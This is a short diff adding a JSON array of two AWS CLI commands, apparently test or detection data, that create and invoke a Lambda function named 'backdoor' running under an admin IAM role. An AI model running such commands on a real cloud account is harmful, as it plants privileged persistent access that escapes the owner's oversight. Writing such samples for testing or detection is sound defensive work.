@@ -1,0 +1,4 @@
+[
+  "aws lambda create-function --function-name backdoor --runtime python3.12 --handler index.handler --role arn:aws:iam::ACCOUNT:role/AdminRole --code S3Bucket=bucket,S3Key=code.zip",
+  "aws lambda invoke --function-name backdoor output.json"
+]
